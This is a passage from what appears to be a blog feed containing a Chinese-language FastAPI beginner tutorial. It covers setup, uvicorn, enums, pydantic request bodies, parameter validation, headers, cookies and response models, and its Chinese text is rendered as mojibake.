class="number">3</span>, TreeNode(<span class="number">2</span>,<span class="literal">None</span>,TreeNode(<span class="number">3</span>)), TreeNode(<span class="number">3</span>, <span class="literal">None</span>, TreeNode(<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(house_rob_iii(root))</span><br><span class="line">root = TreeNode(<span class="number">3</span>,  TreeNode(<span class="number">4</span>,TreeNode(<span class="number">1</span>),TreeNode(<span class="number">3</span>)), TreeNode(<span class="number">5</span>, <span class="literal">None</span>, TreeNode(<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(house_rob_iii(root))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç»“æ„ç®—æ³•</category>
      </categories>
  </entry>
  <entry>
    <title>FastAPI ä»å…¥é—¨åˆ°è½åœ°</title>
    <url>/1a0a2507/</url>
    <content><![CDATA[<blockquote>
<p>FastAPI æ˜¯ä¸€ä¸ªç°ä»£ã€å¿«é€Ÿï¼ˆé«˜æ€§èƒ½ï¼‰çš„ Web æ¡†æ¶.</p>
</blockquote>
<blockquote>
<p>å®˜æ–¹æ–‡æ¡£ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC8=">ğŸšª</span><br>é¡¹ç›®æºç  -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RpYW5nb2xvL2Zhc3RhcGk=">ğŸšª</span><br>Uvicorn -&gt; <span class="exturl" data-url="aHR0cHM6Ly93d3cudXZpY29ybi5vcmcv">ğŸšª</span></p>
</blockquote>
<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install fastapi uvicorn[standard]</span><br></pre></td></tr></table></figure>

<ul>
<li>uvicorn: ASGI(å¼‚æ­¥)æœåŠ¡å™¨</li>
</ul>
<h2 id="åŸºç¡€ä¾‹å­"><a href="#åŸºç¡€ä¾‹å­" class="headerlink" title="åŸºç¡€ä¾‹å­"></a>åŸºç¡€ä¾‹å­</h2><p>åˆ›å»º<code>main.py</code>æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_root</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;Hello&quot;</span>: <span class="string">&quot;World&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/items/&#123;item_id&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_item</span>(<span class="params">item_id: <span class="built_in">int</span>, q: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;item_id&quot;</span>: item_id, <span class="string">&quot;q&quot;</span>: q&#125;</span><br></pre></td></tr></table></figure>

<p><strong>å…³äºå‡½æ•°æ˜¯å¦ä½¿ç”¨<code>async</code>?</strong></p>
<blockquote>
<p>æ–‡æ¡£å‚è€ƒ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS9hc3luYy8jaW4tYS1odXJyeQ==">ğŸšª</span></p>
</blockquote>
<p>å¦‚æœä¸æ¸…æ¥šå‡½æ•°å†…è°ƒç”¨æ˜¯å¦å¼‚æ­¥, é‚£å°±å®šä¹‰ä¸ºæ™®é€šå‡½æ•°, <code>Fastapi</code>ä¼šæ”¾åˆ°<code>thread pool</code>é‡Œæ‰§è¡Œ; å¦‚æœæœ‰ä½¿ç”¨å¼‚æ­¥å¹¶ä¸”æ˜¯åœ¨é«˜å¹¶å‘æƒ…æ™¯ä¸‹, ä½¿ç”¨<code>async</code>é€Ÿåº¦ä¼šæ›´å¿«.</p>
<h2 id="è¿è¡Œå¯åŠ¨"><a href="#è¿è¡Œå¯åŠ¨" class="headerlink" title="è¿è¡Œå¯åŠ¨"></a>è¿è¡Œå¯åŠ¨</h2><h3 id="å‘½ä»¤è¡Œå¯åŠ¨"><a href="#å‘½ä»¤è¡Œå¯åŠ¨" class="headerlink" title="å‘½ä»¤è¡Œå¯åŠ¨"></a>å‘½ä»¤è¡Œå¯åŠ¨</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uvicorn main:app --reload</span><br></pre></td></tr></table></figure>

<ul>
<li><code>main</code>: <code>main.py</code> æ–‡ä»¶ï¼ˆä¸€ä¸ª Python &quot;æ¨¡å—&quot;ï¼‰ã€‚</li>
<li><code>app</code>: åœ¨ <code>main.py</code> æ–‡ä»¶ä¸­é€šè¿‡ <code>app = FastAPI()</code> åˆ›å»ºçš„å¯¹è±¡ã€‚</li>
<li><code>--reload</code>: è®©æœåŠ¡å™¨åœ¨æ›´æ–°ä»£ç åé‡æ–°å¯åŠ¨ã€‚ä»…åœ¨å¼€å‘æ—¶ä½¿ç”¨è¯¥é€‰é¡¹ã€‚</li>
<li><code>--host</code>: è®¾ç½®æ˜ å°„IP, é»˜è®¤127.0.0.1</li>
<li><code>--port</code>: è®¾ç½®æ˜ å°„ç«¯å£, é»˜è®¤8000</li>
</ul>
<p>è®¿é—® <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zLzU/cT1zb21lcXVlcnk=">http://127.0.0.1:8000/items/5?q=somequery</span> ä¼šè¿”å› <code>&#123;&quot;item_id&quot;: 5, &quot;q&quot;: &quot;somequery&quot;&#125;</code></p>
<h3 id="ç¨‹åºå†…å¯åŠ¨"><a href="#ç¨‹åºå†…å¯åŠ¨" class="headerlink" title="ç¨‹åºå†…å¯åŠ¨"></a>ç¨‹åºå†…å¯åŠ¨</h3><p>å¯ä»¥ç”¨äºè°ƒè¯•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"></span><br><span class="line"><span class="comment"># body...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    uvicorn.run(app, host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>



<h2 id="è‡ªå¸¦æ–‡æ¡£"><a href="#è‡ªå¸¦æ–‡æ¡£" class="headerlink" title="è‡ªå¸¦æ–‡æ¡£"></a>è‡ªå¸¦æ–‡æ¡£</h2><ul>
<li>è®¿é—® <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2RvY3M=">http://127.0.0.1:8000/docs</span> æ˜¯ç”±<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N3YWdnZXItYXBpL3N3YWdnZXItdWk=">Swagger UI</span>è‡ªåŠ¨ç”Ÿæˆçš„äº¤äº’å¼æ–‡æ¡£</li>
<li>è®¿é—® <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL3JlZG9j">http://127.0.0.1:8000/redoc</span> æ˜¯ç”±<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1JlYmlsbHkvUmVEb2M=">ReDoc</span> ç”Ÿæˆè‡ªåŠ¨ç”Ÿæˆçš„äº¤äº’å¼æ–‡æ¡£</li>
</ul>
<h2 id="è®¾ç½®æšä¸¾ç±»å‹"><a href="#è®¾ç½®æšä¸¾ç±»å‹" class="headerlink" title="è®¾ç½®æšä¸¾ç±»å‹"></a>è®¾ç½®æšä¸¾ç±»å‹</h2><p>å¯¼å…¥<code>Enum</code></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="keyword">enum</span> <span class="keyword">import</span> Enum</span><br></pre></td></tr></table></figure>

<p>ç»§æ‰¿å¹¶å£°æ˜æšä¸¾ç±»</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">ModelName</span>(<span class="symbol">str, <span class="symbol">Enum</span></span>):</span><br><span class="line">    <span class="symbol">alexnet</span> = &quot;<span class="symbol">alexnet</span>&quot;</span><br><span class="line">    <span class="symbol">resnet</span> = &quot;<span class="symbol">resnet</span>&quot;</span><br><span class="line">    <span class="symbol">lenet</span> = &quot;<span class="symbol">lenet</span>&quot;</span><br></pre></td></tr></table></figure>

<p>å°†å…¶å£°æ˜ä¸ºå‚æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/models/&#123;model_name&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_model</span>(<span class="params">model_name: ModelName</span>):</span><br><span class="line">    <span class="keyword">if</span> model_name == ModelName.alexnet:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;model_name&quot;</span>: model_name, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Deep Learning FTW!&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> model_name.value == <span class="string">&quot;lenet&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;model_name&quot;</span>: model_name, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;LeCNN all the images&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;model_name&quot;</span>: model_name, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Have some residuals&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="è®¾ç½®è¯·æ±‚ä½“"><a href="#è®¾ç½®è¯·æ±‚ä½“" class="headerlink" title="è®¾ç½®è¯·æ±‚ä½“"></a>è®¾ç½®è¯·æ±‚ä½“</h2><h3 id="åŸºç¡€åº”ç”¨"><a href="#åŸºç¡€åº”ç”¨" class="headerlink" title="åŸºç¡€åº”ç”¨"></a>åŸºç¡€åº”ç”¨</h3><p>å¯¼å…¥<code>BaseModel</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel</span><br></pre></td></tr></table></figure>

<p>ç»§æ‰¿å¹¶å£°æ˜æ•°æ®æ¨¡å‹ç±»</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Item</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    description: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span></span><br><span class="line">    price: <span class="built_in">float</span></span><br><span class="line">    tax: <span class="type">Optional</span>[<span class="built_in">float</span>] = <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>å°†å…¶å£°æ˜ä¸ºå‚æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/items/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_item</span>(<span class="params">item: Item</span>):</span><br><span class="line">    <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>

<p>è¯·æ±‚æ ¼å¼åº”ä¸º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Foo&quot;</span>,</span><br><span class="line">  <span class="string">&quot;description&quot;</span>: <span class="string">&quot;An optional description&quot;</span>,</span><br><span class="line">  <span class="string">&quot;price&quot;</span>: <span class="number">45.2</span>,</span><br><span class="line">  <span class="string">&quot;tax&quot;</span>: <span class="number">3.5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å¤šä¸ªè¯·æ±‚ä½“å‚æ•°"><a href="#å¤šä¸ªè¯·æ±‚ä½“å‚æ•°" class="headerlink" title="å¤šä¸ªè¯·æ±‚ä½“å‚æ•°"></a>å¤šä¸ªè¯·æ±‚ä½“å‚æ•°</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    username: <span class="built_in">str</span></span><br><span class="line">    full_name: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.put(<span class="params"><span class="string">&quot;/items/&#123;item_id&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">update_item</span>(<span class="params">item_id: <span class="built_in">int</span>, item: Item, user: User</span>):</span><br><span class="line">    results = &#123;<span class="string">&quot;item_id&quot;</span>: item_id, <span class="string">&quot;item&quot;</span>: item, <span class="string">&quot;user&quot;</span>: user&#125;</span><br><span class="line">    <span class="keyword">return</span> results</span><br></pre></td></tr></table></figure>

<p>è¯·æ±‚æ ¼å¼åº”ä¸º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;item&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Foo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;The pretender&quot;</span>,</span><br><span class="line">        <span class="string">&quot;price&quot;</span>: <span class="number">42.0</span>,</span><br><span class="line">        <span class="string">&quot;tax&quot;</span>: <span class="number">3.2</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;dave&quot;</span>,</span><br><span class="line">        <span class="string">&quot;full_name&quot;</span>: <span class="string">&quot;Dave Grohl&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å•ä¸ªè¯·æ±‚ä½“å‚æ•°"><a href="#å•ä¸ªè¯·æ±‚ä½“å‚æ•°" class="headerlink" title="å•ä¸ªè¯·æ±‚ä½“å‚æ•°"></a>å•ä¸ªè¯·æ±‚ä½“å‚æ•°</h3><p>å¯¼å…¥<code>Body</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> Body</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>Body()</code>è®¾ç½®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/items/&#123;item_id&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">update_item</span>(<span class="params">item_id: <span class="built_in">int</span>, item: Item = Body(<span class="params">..., embed=<span class="literal">True</span></span>)</span>):</span><br><span class="line">    results = &#123;<span class="string">&quot;item_id&quot;</span>: item_id, <span class="string">&quot;item&quot;</span>: item&#125;</span><br><span class="line">    <span class="keyword">return</span> results</span><br></pre></td></tr></table></figure>

<p>è¯·æ±‚æ ¼å¼åº”ä¸º</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;item&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Foo&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;The pretender&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;price&quot;</span><span class="punctuation">:</span> <span class="number">42.0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tax&quot;</span><span class="punctuation">:</span> <span class="number">3.2</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="åµŒå¥—æ ¼å¼è¯·æ±‚ä½“"><a href="#åµŒå¥—æ ¼å¼è¯·æ±‚ä½“" class="headerlink" title="åµŒå¥—æ ¼å¼è¯·æ±‚ä½“"></a>åµŒå¥—æ ¼å¼è¯·æ±‚ä½“</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Image</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    url: HttpUrl</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Item</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    image: <span class="type">Optional</span>[Image] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.put(<span class="params"><span class="string">&quot;/items/&#123;item_id&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">update_item</span>(<span class="params">item_id: <span class="built_in">int</span>, item: Item</span>):</span><br><span class="line">    results = &#123;<span class="string">&quot;item_id&quot;</span>: item_id, <span class="string">&quot;item&quot;</span>: item&#125;</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¯·æ±‚æ ¼å¼åº”ä¸º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;images&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://example.com/baz.jpg&quot;</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;The Foo live&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://example.com/dave.jpg&quot;</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;The Baz&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ä¸ºå‚æ•°æ·»åŠ æ ¡éªŒ"><a href="#ä¸ºå‚æ•°æ·»åŠ æ ¡éªŒ" class="headerlink" title="ä¸ºå‚æ•°æ·»åŠ æ ¡éªŒ"></a>ä¸ºå‚æ•°æ·»åŠ æ ¡éªŒ</h2><h3 id="æŸ¥è¯¢å‚æ•°æ ¡éªŒ"><a href="#æŸ¥è¯¢å‚æ•°æ ¡éªŒ" class="headerlink" title="æŸ¥è¯¢å‚æ•°æ ¡éªŒ"></a>æŸ¥è¯¢å‚æ•°æ ¡éªŒ</h3><p>å¯¼å…¥<code>Query</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> Query</span><br></pre></td></tr></table></figure>

<p>å°† <code>Query</code> ç”¨ä½œæŸ¥è¯¢å‚æ•°çš„é»˜è®¤å€¼ï¼Œå¹¶è®¾ç½®<code>min_length</code>ä¸º3,<code>max_length</code>ä¸º9</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/items/&quot;</span></span>)</span></span><br><span class="line"><span class="comment"># Query çš„ç¬¬ä¸€ä¸ªå‚æ•°ç”¨äºå®šä¹‰é»˜è®¤å€¼</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">read_items</span>(<span class="params">q: <span class="type">Optional</span>[<span class="built_in">str</span>] = Query(<span class="params"><span class="literal">None</span>, min_length=<span class="number">3</span>, max_length=<span class="number">9</span></span>)</span>):</span><br><span class="line">    results = &#123;<span class="string">&quot;items&quot;</span>: [&#123;<span class="string">&quot;item_id&quot;</span>: <span class="string">&quot;Foo&quot;</span>&#125;, &#123;<span class="string">&quot;item_id&quot;</span>: <span class="string">&quot;Bar&quot;</span>&#125;]&#125;</span><br><span class="line">    <span class="keyword">if</span> q:</span><br><span class="line">        results.update(&#123;<span class="string">&quot;q&quot;</span>: q&#125;)</span><br><span class="line">    <span class="keyword">return</span> results</span><br></pre></td></tr></table></figure>

<p>å…¶å®ƒæ ¡éªŒå‚æ•°(å¯¹åº”ç±»å‹ä¸ºintæˆ–float)</p>
<ul>
<li><code>gt</code>ï¼šå¤§äºï¼ˆ<code>g</code>reater <code>t</code>hanï¼‰</li>
<li><code>ge</code>ï¼šå¤§äºç­‰äºï¼ˆ<code>g</code>reater than or <code>e</code>qualï¼‰</li>
<li><code>lt</code>ï¼šå°äºï¼ˆ<code>l</code>ess <code>t</code>hanï¼‰</li>
<li><code>le</code>ï¼šå°äºç­‰äºï¼ˆ<code>l</code>ess than or <code>e</code>qualï¼‰</li>
</ul>
<p>ä¹Ÿå¯ä»¥ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œåˆ¤æ–­<code>regex</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Query(<span class="literal">None</span>, regex=<span class="string">r&quot;.&#123;3,9&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•ä¸€ä¸‹</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zLz9xPTEy">http://127.0.0.1:8000/items/?q=12</span></li>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zLz9xPTEyMzQ1Ng==">http://127.0.0.1:8000/items/?q=123456</span></li>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zLz9xPTEyMzQ1Njc4OTA=">http://127.0.0.1:8000/items/?q=1234567890</span></li>
</ul>
<h3 id="ä½¿ç”¨å‚æ•°åˆ«å"><a href="#ä½¿ç”¨å‚æ•°åˆ«å" class="headerlink" title="ä½¿ç”¨å‚æ•°åˆ«å"></a>ä½¿ç”¨å‚æ•°åˆ«å</h3><p>åœ¨Queryä¸­ä½¿ç”¨<code>alias</code>, è®¾ç½®<code>q</code>åˆ«åä¸º<code>item-query</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&#x27;/items/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">read_items</span>(<span class="params">q: <span class="type">Optional</span>[<span class="built_in">str</span>] = Query(<span class="params"><span class="literal">None</span>, alias=<span class="string">&quot;item-query&quot;</span></span>)</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;q&#x27;</span>: q&#125;</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•ä¸€ä¸‹</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zP3E9aGVsbG8=">http://127.0.0.1:8000/items?q=hello</span></li>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zP2l0ZW0tcXVlcnk9aGVsbG8=">http://127.0.0.1:8000/items?item-query=hello</span></li>
</ul>
<h3 id="è·¯å¾„å‚æ•°æ ¡éªŒ"><a href="#è·¯å¾„å‚æ•°æ ¡éªŒ" class="headerlink" title="è·¯å¾„å‚æ•°æ ¡éªŒ"></a>è·¯å¾„å‚æ•°æ ¡éªŒ</h3><p>å¯¼å…¥<code>Path</code></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> <span class="type">Path</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨æ–¹æ³•å’Œ<code>Query</code>ä¸€æ ·, ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºé»˜è®¤å‚æ•°, ä½¿ç”¨<code>...</code>è¡¨ç¤ºè¯¥å‚æ•°ä¸ºå¿…éœ€å‚æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/items/&#123;item_id&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">read_items</span>(<span class="params"></span></span><br><span class="line"><span class="params">    *,</span></span><br><span class="line"><span class="params">    item_id: <span class="built_in">int</span> = Path(<span class="params">..., title=<span class="string">&quot;The ID of the item to get&quot;</span>, ge=<span class="number">0</span>, le=<span class="number">1000</span></span>),</span></span><br><span class="line"><span class="params">    size: <span class="built_in">float</span> = Query(<span class="params">..., gt=<span class="number">0</span>, lt=<span class="number">10.5</span></span>)</span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;item_id&quot;</span>: item_id&#125;</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•ä¸€ä¸‹</p>
<ul>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zLzEwMDA/c2l6ZT0xLjI=">http://127.0.0.1:8000/items/1000?size=1.2</span></li>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwL2l0ZW1zLzEwMA==">http://127.0.0.1:8000/items/100</span></li>
</ul>
<h3 id="è¯·æ±‚ä½“å­—æ®µæ ¡éªŒ"><a href="#è¯·æ±‚ä½“å­—æ®µæ ¡éªŒ" class="headerlink" title="è¯·æ±‚ä½“å­—æ®µæ ¡éªŒ"></a>è¯·æ±‚ä½“å­—æ®µæ ¡éªŒ</h3><blockquote>
<p>å®˜æ–¹å‚è€ƒ -&gt; <span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC90dXRvcmlhbC9ib2R5LWZpZWxkcy8=">ğŸšª</span></p>
</blockquote>
<p><em><strong>æ³¨: Bodyã€Queryã€Pathçš„å¤§éƒ¨åˆ†å‚æ•°æ˜¯ä¸€æ ·çš„</strong></em></p>
<h2 id="è·å–Headerå’ŒCookie"><a href="#è·å–Headerå’ŒCookie" class="headerlink" title="è·å–Headerå’ŒCookie"></a>è·å–Headerå’ŒCookie</h2><p>å¯¼å…¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> Header, Cookie</span><br></pre></td></tr></table></figure>

<p>å£°æ˜</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/items/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_items</span>(<span class="params">user_agent: <span class="type">Optional</span>[<span class="built_in">str</span>] = Header(<span class="params"><span class="literal">None</span></span>), ads_id: <span class="type">Optional</span>[<span class="built_in">str</span>] = Cookie(<span class="params"><span class="literal">None</span></span>):</span></span><br><span class="line"><span class="params">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="params">        <span class="string">&quot;User-Agent&quot;</span>: user_agent,</span></span><br><span class="line"><span class="params">    	<span class="string">&quot;ads_id&quot;</span>: ads_id</span></span><br><span class="line"><span class="params">    &#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="å“åº”å’Œè¾“å‡º"><a href="#å“åº”å’Œè¾“å‡º" class="headerlink" title="å“åº”å’Œè¾“å‡º"></a>å“åº”å’Œè¾“å‡º</h2><h3 id="è®¾ç½®è¾“å‡ºæ¨¡å‹"><a href="#è®¾ç½®è¾“å‡ºæ¨¡å‹" class="headerlink" title="è®¾ç½®è¾“å‡ºæ¨¡å‹"></a>è®¾ç½®è¾“å‡ºæ¨¡å‹</h3><p><code>@app</code>è®¾ç½®<code>response_model</code>å‚æ•°, </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel, EmailStr</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserIn</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    username: <span class="built_in">str</span></span><br><span class="line">    password: <span class="built_in">str</span></span><br><span class="line">    email: EmailStr</span><br><span class="line">    full_name: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºæ¨¡å‹ä¸åŒ…å«å¯†ç </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserOut</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    username: <span class="built_in">str</span></span><br><span class="line">    email: EmailStr</span><br><span class="line">    full_name: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®å¯¹åº”è¾“å‡ºæ¨¡å‹</span></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/user/&quot;</span>, response_model=UserOut</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">create_user</span>(<span class="params">user: 